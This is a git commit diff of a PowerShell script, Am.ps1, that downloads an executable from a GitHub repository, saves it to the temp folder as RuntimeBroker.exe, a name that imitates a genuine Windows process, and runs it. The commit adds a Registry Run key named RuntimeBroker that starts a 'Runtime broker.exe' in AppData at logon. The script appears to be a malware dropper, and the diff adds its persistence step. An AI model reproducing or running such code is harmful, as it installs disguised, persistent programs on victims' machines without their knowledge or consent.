157be33eb6e37d1d04759b494ce6b34e3a40cf3d
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-08 13:10:16 -0800

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -3,3 +3,7 @@ $url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/Run
 $output = "$env:Temp/RuntimeBroker.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
+$exePath = "$env:APPDATA\SubDir\Runtime broker.exe"
+$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regValueName = "RuntimeBroker"
+Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
